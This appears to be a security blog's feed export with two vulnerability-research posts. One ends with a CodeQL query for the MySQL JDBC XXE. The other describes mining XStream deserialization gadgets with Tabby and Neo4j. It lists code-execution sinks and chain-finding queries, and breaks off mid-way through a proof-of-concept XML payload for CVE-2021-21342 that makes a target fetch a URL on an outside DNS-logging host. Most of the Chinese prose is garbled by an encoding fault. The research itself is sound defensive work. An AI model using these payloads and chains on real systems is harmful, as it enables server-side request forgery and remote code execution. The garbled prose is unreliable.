&amp;&amp; <span class="built_in">cd</span> mysql-connector-j-8.0.25</span><br><span class="line"></span><br><span class="line">mkdir lib &amp;&amp; <span class="built_in">cd</span> lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># download ant build libs</span></span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-api/5.6.2/junit-jupiter-api-5.6.2.jar -O junit-jupiter-api-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-engine/5.6.2/junit-jupiter-engine-5.6.2.jar -O junit-jupiter-engine-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-commons/1.6.2/junit-platform-commons-1.6.2.jar -O junit-platform-commons-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-engine/1.6.2/junit-platform-engine-1.6.2.jar -O junit-platform-engine-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-launcher/1.6.2/junit-platform-launcher-1.6.2.jar -O junit-platform-launcher-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar -O apiguardian-api-1.1.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/opentest4j/opentest4j/1.2.0/opentest4j-1.2.0.jar -O opentest4j-1.2.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/javassist/javassist/3.27.0-GA/javassist-3.27.0-GA.jar -O javassist-3.27.0-GA.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/google/protobuf/protobuf-java/3.11.4/protobuf-java-3.11.4.jar -O protobuf-java-3.11.4.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/mchange/c3p0/0.9.5.5/c3p0-0.9.5.5.jar -O c3p0-0.9.5.5.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar -O slf4j-api-1.7.30.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/hamcrest/hamcrest/2.2/hamcrest-2.2.jar -O hamcrest-2.2.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># build.properties</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cat &lt;&lt; EOF &gt; build.properties</span><br><span class="line">com.mysql.cj.build.jdk=<span class="variable">$JAVA_HOME</span></span><br><span class="line">com.mysql.cj.extra.libs=./lib</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># codeql build</span></span><br><span class="line">codeql database create mysql-qldb -l java --<span class="built_in">command</span>=<span class="string">&quot;ant dist&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Run-QL-Search"><a href="#Run-QL-Search" class="headerlink" title="Run QL Search"></a>Run QL Search</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> MySQL JDBC XXE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> mysql jdbc xxe.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@problem</span>.severity error</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@precision</span> high</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id</span> java/xxe</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@tags</span> security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-611</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.security.XmlParsers</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.TaintTracking2</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.frameworks.Jdbc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MySQLJdbcSource</span> <span class="keyword">extends</span> <span class="title">RemoteFlowSource</span> </span>&#123;</span><br><span class="line">  MySQLJdbcSource()&#123;</span><br><span class="line">    exists(MethodAccess m | m = <span class="keyword">this</span>.asExpr() |</span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.protocol.a&quot;</span>, <span class="string">&quot;SimplePacketReader&quot;</span>)</span><br><span class="line">        and (m.getMethod().hasName(<span class="string">&quot;readMessage&quot;</span>) or m.getMethod().hasName(<span class="string">&quot;readHeader&quot;</span>))</span><br><span class="line">      )</span><br><span class="line">      or </span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc.result&quot;</span>, <span class="string">&quot;ResultSetImpl&quot;</span>) </span><br><span class="line">        and (m.getMethod().getName().substring(<span class="number">0</span>, <span class="number">3</span>) = <span class="string">&quot;get&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function">override string <span class="title">getSourceType</span><span class="params">()</span> </span>&#123; result = <span class="string">&quot;jdbc&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">class SafeSAXSourceFlowConfig extends TaintTracking2::Configuration &#123;</span><br><span class="line">  SafeSAXSourceFlowConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XmlParsers::SafeSAXSourceFlowConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src.asExpr() <span class="keyword">instanceof</span> SafeSAXSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">    sink.asExpr() = any(XmlParserCall parse).getSink()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override <span class="keyword">int</span> <span class="title">fieldFlowBranchLimit</span><span class="params">()</span> </span>&#123; result = <span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UnsafeXxeSink extends DataFlow::ExprNode &#123;</span><br><span class="line">  UnsafeXxeSink() &#123;</span><br><span class="line">    <span class="function">not <span class="title">exists</span><span class="params">(SafeSAXSourceFlowConfig safeSource | safeSource.hasFlowTo(<span class="keyword">this</span>)</span>) and</span></span><br><span class="line"><span class="function">    <span class="title">exists</span><span class="params">(XmlParserCall parse |</span></span></span><br><span class="line"><span class="function"><span class="params">      parse.getSink()</span> </span>= <span class="keyword">this</span>.getExpr() and</span><br><span class="line">      not parse.isSafe()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XxeConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  XxeConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XXE.ql::XxeConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123; sink <span class="keyword">instanceof</span> UnsafeXxeSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, XxeConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;Unsafe parsing of XML file from $@.&quot;</span>, source.getNode(),</span><br><span class="line">  <span class="string">&quot;user input&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-181.png" alt="upload successful"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Postgresqlå¾ˆæ—©å°±æœ‰XXE CVEï¼Œæ¨ªå‘æ€ç»´æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¯æƒœè¿˜æ˜¯ä¸å¤Ÿä¸èƒ½ä¸»åŠ¨å‘ç°ğŸ˜­</p><p>CodeQLæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨æ„å»ºè°ƒç”¨å›¾çš„åŸºç¡€ä¸Šï¼Œæœ‰ä¸€å¥—è§£é‡Šå‹è¯­è¨€æ¥è¿›è¡Œæœç´¢ï¼Œæ¯”neo4jè¦æ–¹ä¾¿å¾ˆå¤šã€‚å€¼å¾—æ·±å…¥å­¦ä¹ ï¼Œæœ¬ç¯‡ç®—æ˜¯è®°å½•CodeQLå­¦ä¹ çš„å…¥é—¨ç¯‡ï¼ŒæœŸå¾…ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://paper.seebug.org/1324/">ä½¿ç”¨ CodeQL åˆ†æé—­æº Java ç¨‹åº</a></li><li>[2] <a href="https://github.com/github/codeql/issues/4304">can codeql analyse java rt.jar source code? #4304</a></li><li>[3] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-installing-source.html">SQL Connector/J 8.0 Developer Guide  /  Connector/J Installation  /  Installing from Source</a></li><li>[4] <a href="https://codeql.github.com/codeql-query-help/java/">CodeQL query help for Java</a></li><li>[5] <a href="https://github.com/SecCoder-Security-Lab/jdbc-sqlxml-xxe">SecCoder-Security-Lab/jdbc-sqlxml-xxe </a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;pyn3rdå¸ˆå‚…çš„ã€ŠMake JDBC Attack Brilliant Againã€‹ä¸­æœ‰ä¸€ä¸ª0dayæ˜¯mysql jdbc xxeï¼Œthread3amå¸ˆå‚…ä¹Ÿæ—©å°±å¤ç°å‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜å‘ç°äº†h2çš„xxeã€‚è†œä¸€ä¸ªï¼Œå¸ˆå‚…ä»¬éƒ½å¤ªğŸ‚ğŸºäº†ã€‚å¾ˆå¤šå¸ˆå‚…ä»¬ä¹Ÿå¤ç°äº†ï¼Œå†è®²ä¹Ÿæ²¡å•¥æ„æ€äº†ï¼Œç”¨CodeQLæ•´ç‚¹æ–°çš„å§ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;CVE-2021-2471 mysql jdbc xxeåœ¨HITB ppté‡Œé¢ï¼Œæ²¡æœ‰è®²DOMSource XXEè¿™ä¸€éƒ¨åˆ†ï¼ŒåŸå› åº”è¯¥æ˜¯pyn3rdå¸ˆå‚…ææ¼æ´è¿˜æœªå…¬å¼€ï¼Œæ²¡å†™åœ¨ppté‡Œé¢ã€‚æ‰€ä»¥è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªä¸œè¥¿ï¼š&lt;/p&gt;
&lt;p&gt; a. DOMSource XXE, å½±å“æ‰€æœ‰ç‰ˆæœ¬ï¼Œå®˜æ–¹8.0.27ä¸­ä¿®å¤æ‰äº†&lt;/p&gt;
&lt;p&gt; b. Fabric XXE, å½±å“5.x, åœ¨5.1.49ä¸­ä¿®å¤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CodeQL CWE-611æœ‰XXEçš„æ£€æµ‹pocï¼Œä¸è¿‡sourceæºä¸æ”¯æŒmysqlã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;CVE-2021-2471&quot;&gt;&lt;a href=&quot;#CVE-2021-2471&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-2471&quot;&gt;&lt;/a&gt;CVE-2021-2471&lt;/h2&gt;&lt;h3 id=&quot;DOMSource-XXE&quot;&gt;&lt;a href=&quot;#DOMSource-XXE&quot; class=&quot;headerlink&quot; title=&quot;DOMSource XXE&quot;&gt;&lt;/a&gt;DOMSource XXE&lt;/h3&gt;&lt;p&gt;æ¼æ´ä»£ç åœ¨ com.mysql.cj.jdbc.MysqlSQLXML#getSource&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Mysql" scheme="http://m0d9.me/tags/Mysql/"/>
    
    <category term="XXE" scheme="http://m0d9.me/tags/XXE/"/>
    
    <category term="Fabric" scheme="http://m0d9.me/tags/Fabric/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–ï¼ˆä¸‰ï¼‰â€”â€”Tabby CVEä¹‹æ—…</title>
    <link href="http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/"/>
    <id>http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</id>
    <published>2021-08-29T09:03:00.000Z</published>
    <updated>2022-03-28T03:33:41.126Z</updated>
    
    <content type="html"><![CDATA[<p>æœˆåº•åœ¨å³ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿ï¼Œæ¯æœˆä¸€ç¯‡éƒ½è¦é£Ÿè¨€äº†ã€‚ä¸Šä¸ªæœˆåˆšæŒ–çš„OpenRASPçš„å‘ï¼Œæœ¬æ‰“ç®—å†ç ”ç©¶ç ”ç©¶ç»•è¿‡å§¿åŠ¿ï¼ŒéªŒè¯ä¸‹çŒœæƒ³ï¼Œä¹Ÿæ²¡ä¸‹æ–‡ã€‚æ­£å¥½6æœˆä»½äº¤çš„XStream SSRF Gadget CVEä¸‹æ¥ï¼Œä¹‹å‰XStreamç³»åˆ—è‰ç¨¿ç®±é‡Œä¹Ÿå¾…ç€ä¹‹å‰é€†å‘åˆ†æå¸ˆå‚…ä»¬æŒ–æ˜çš„æ€è·¯&amp;æ‰‹æ³•ï¼Œæ­£å¥½ç¼–è¾‘ç¼–è¾‘ï¼Œæ°´ä¸€ç¯‡â€å¦‚ä½•æŒ–æ˜XStream Gadgetsâ€ã€‚</p><p>é¦–å…ˆæ„Ÿè°¢Wh1t3p1gå¸ˆå‚…çš„Tabbyï¼Œç”¨èµ·æ¥æ¯”gadgetinspectoræ›´é¡ºæ‰‹ï¼Œæ‰¾é“¾ç¥å™¨ã€‚</p><h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>æœ‰å…³Tabbyçš„ä»‹ç»ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒã€1ã€‘ä¸­Wh1t3p1gå¸ˆå‚…çš„å‡ ä¸ªwikiï¼Œå†™çš„å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šå•°å—¦ã€‚ï¼ˆè¿™é‡Œè†œä¸€ä¸‹Wh1t3p1gå¸ˆå‚…ï¼‰</p><p>Neo4j æŸ¥è¯¢æ¯”è¾ƒåƒcpuï¼Œå°æœ¬æœ¬åŠ ä¸ŠideaåŒæ—¶è·‘åƒåŠ›ï¼Œæå°vpsè·‘æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯tabbyæ˜¯é€šè¿‡apoc.load.csv fileå†™Neo4jæ•°æ®çš„ï¼Œç›¸å½“äºé™åˆ¶äº†æœ¬æœºï¼Œå› æ­¤ç»™ä¸‹æ•´åº“çš„dumpå’Œloadï¼ˆå½“ç„¶ï¼Œç›´æ¥æ•´ä¸ªåœ¨vpsä¸Šæ“ä½œä¹Ÿæ˜¯okçš„ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump neo4j database</span></span><br><span class="line">neo4j-admin dump --to /tmp/neo4j.dump --database neo4j</span><br><span class="line"><span class="comment"># scp dump file to vps</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load neo4j dump file</span></span><br><span class="line">./bin/neo4j stop</span><br><span class="line">./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force</span><br><span class="line">./bin/neo4j start</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Gadgetsç»“æ„"><a href="#Gadgetsç»“æ„" class="headerlink" title="Gadgetsç»“æ„"></a>Gadgetsç»“æ„</h2><p>å‰æ–‡çš„ä¼—å¤šçš„RCE Gadgetsåˆ†æä¸­å‘ç°Gadgetsçš„ç»“æ„å¤§è‡´åˆ†ä¸ºï¼š</p><p><strong>Bulletï¼š</strong><br>å®ç°æœ€ç»ˆçš„RCE</p><p>rce:</p><ol><li>ProcessBuilder.start() æ— å‚æ•°</li><li>Runtime.getRuntime().exec(cmd) æœ‰å‚</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) æ— å‚</li><li>MethodClosure.call() æ— å‚</li></ol><p>ssrf:</p><ol><li>java.net.URL#openConnection</li></ol><p><strong>æ ¸å¿ƒä¸­é—´é“¾</strong><br>ä¸­é—´é“¾æ˜¯æ•´ä¸ªå¯»æ‰¾Gadgetsçš„æ ¸å¿ƒï¼Œç®€å•çš„å¯èƒ½æ²¡æœ‰ä¸­é—´é“¾ï¼Œå¤æ‚çš„å¯èƒ½ä¼šç»„åˆä½¿ç”¨</p><ol><li>invoke å®ç°ä¸Šæœ‰é—®é¢˜çš„ InvokeHandlerï¼Œå¦‚<ul><li>EventHandler</li><li>æ­é…MethodClosureçš„ConvertedClosure</li></ul></li><li>hashCodeã€compareã€equalå®ç°æœ‰é—®é¢˜çš„Map/Set/Queueï¼Œå¦‚<ul><li>Expandoï¼ŒhashCodeæ­é…MethodClosureå¯ä»¥RCE</li><li>CVE-2021-21345 ServerTableEntry verifyæ–¹æ³•å¯RCE</li></ul></li><li>å­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„classï¼ˆè¿™ä¸€ç±»æ™®éå­˜åœ¨ï¼‰<ul><li>CVE-2020-26217 ImageIO$ContainsFilterï¼Œfilteræ–¹æ³•å†…å¯æ§</li><li>CVE-2021-21344 Accessor$GetterSetterReflectionï¼Œgetæ–¹æ³•å¯æ§</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSomeæ–¹æ³•å†…invokeå¯æ§</li></ul></li><li>åˆ©ç”¨ClassLoaderå®ä¾‹åŒ–<ul><li>ServiceLoader$LazyIteratorï¼Œè°ƒç”¨ç‚¹ä¸ºClass.forName (name,initialize,loader) ï¼ŒæŒ‡å®šloaderä¸ºBCEL classLoaer</li><li>CVE-2021-21347ï¼Œè°ƒç”¨ç‚¹ä¸ºloader.loadClass(name).newInstance()ï¼Œåˆ©ç”¨java.net.URLClassLoaderåŠ è½½è¿œç¨‹jarç±»å¹¶å®ä¾‹åŒ–</li><li>CVE-2021-21350ï¼Œå’ŒLazyIteratorä¸€æ ·ï¼Œåˆ©ç”¨BCEL classLoader</li></ul></li></ol><p><strong>Triggerï¼š</strong><br>ç±»ä¼¼æ‰³æœºçš„ä½œç”¨ï¼Ÿæ•´ä¸ªé“¾çš„èµ·ç‚¹</p><ol><li>MapConverter/TreeSetConveter/TreeMapConveteréƒ½ä¼šè§¦å‘è¿™äº›é›†åˆ/è¡¨ å†…å…ƒç´ çš„å†…éƒ¨å‡½æ•°ï¼Œæ¯”å¦‚compareã€hashCodeã€equalsè¿™äº›å‡½æ•°ã€‚<ul><li>MapConverterç±»å‹putå¯¹è±¡æ—¶è°ƒç”¨è¯¥å¯¹è±¡çš„hashCodeã€equalsã€toStringæ–¹æ³•</li><li>TreeSetè°ƒç”¨putå¯¹è±¡æ—¶è°ƒç”¨è¯¥å¯¹è±¡çš„compareToæ–¹æ³•</li><li>PriorityQueueè§¦å‘comparatorå±æ€§ä¸­compareæ–¹æ³•</li></ul></li><li>DynamicProxyConverter ä»£ç†ç±»ï¼ŒInvocationHandlerå¯æ§ï¼Œå¯¼è‡´ä¸€äº›invokeå­˜åœ¨RCEé£é™©çš„InvocationHandlerç±»ï¼Œå¦‚EventHandlerï¼Œå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚</li></ol><h2 id="CVEs"><a href="#CVEs" class="headerlink" title="CVEs"></a>CVEs</h2><p>åœ¨äº†è§£äº†neo4j &amp; tabby &amp; Gadgesç»„æˆ çš„åŸºç¡€ä¸Šï¼Œé‚£å°±è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨Tabbyçš„æŒ–æ˜XStream Gadgetsã€‚ç²¾åŠ›æœ‰é™ï¼Œä»¥ä»¥ä¸‹å‡ ä¸ªCVEä¸ºä¾‹ï¼ˆéš¾æ˜“ç¨‹åº¦æ’åºï¼‰</p><ul><li>CVE-2021-21342 </li><li>CVE-2021-39152</li><li>CVE-2021-21351</li><li>CVE-2021-21346</li><li>CVE-2021-21347/21350</li><li>CVE-2020-26217</li><li>CVE-2021-21344/21345</li></ul><h3 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h3><h4 id="å¯»æ‰¾Bullet"><a href="#å¯»æ‰¾Bullet" class="headerlink" title="å¯»æ‰¾Bullet"></a>å¯»æ‰¾Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾ä¸­é—´é“¾"><a href="#å¯»æ‰¾ä¸­é—´é“¾" class="headerlink" title="å¯»æ‰¾ä¸­é—´é“¾"></a>å¯»æ‰¾ä¸­é—´é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openStream&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>èŠ‚ç‚¹å¾ˆå¤šï¼Œä»¥javax.activation.URLDataSource$getInputStream ä¸ºä¾‹</p><p><img src="/images/pasted-156.png" alt="upload successful"></p><h4 id="å¯»æ‰¾Trigger"><a href="#å¯»æ‰¾Trigger" class="headerlink" title="å¯»æ‰¾Trigger"></a>å¯»æ‰¾Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;getOutputStream&quot; and m1.CLASSNAME&#x3D;&quot;javax.activation.URLDataSource&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-161.png" alt="upload successful"></p><!-- ![upload successful](/images/pasted-144.png) --><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>false<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.client.ResponseContext&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span> <span class="attr">class</span>=<span class="string">&quot;java.util.IdentityHashMap&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">size</span>&gt;</span>0<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">satellites</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;javax.activation.URLDataSource&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://cve21342.xstream.1.dns.m0d9.me/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">              <span 